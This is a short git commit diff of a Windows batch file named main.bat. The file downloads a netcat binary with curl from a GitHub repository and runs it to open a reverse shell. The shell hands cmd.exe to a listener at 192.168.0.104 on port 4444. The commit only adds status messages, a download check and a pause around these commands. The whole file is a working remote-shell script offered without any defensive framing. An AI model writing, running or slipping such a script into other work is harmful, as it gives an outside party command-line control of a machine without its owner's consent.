98e03b3e641933d42477be3aef108c7b89f90c46
u7mi <115493111+u7mi@users.noreply.github.com>
2025-02-10 21:31:47 +0300

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,3 +1,13 @@
 @echo off
-curl -o nc.exe https://github.com/diegocr/netcat/raw/refs/heads/master/nc.exe
-nc.exe 192.168.0.104 4444 -e cmd
+echo Downloading nc.exe...
+curl -L -o nc.exe https://github.com/diegocr/netcat/raw/master/nc.exe
+
+if exist nc.exe (
+    echo nc.exe downloaded successfully.
+    echo Connecting to 192.168.0.104:4444...
+    nc.exe 192.168.0.104 4444 -e cmd.exe
+) else (
+    echo Failed to download nc.exe.
+)
+
+pause
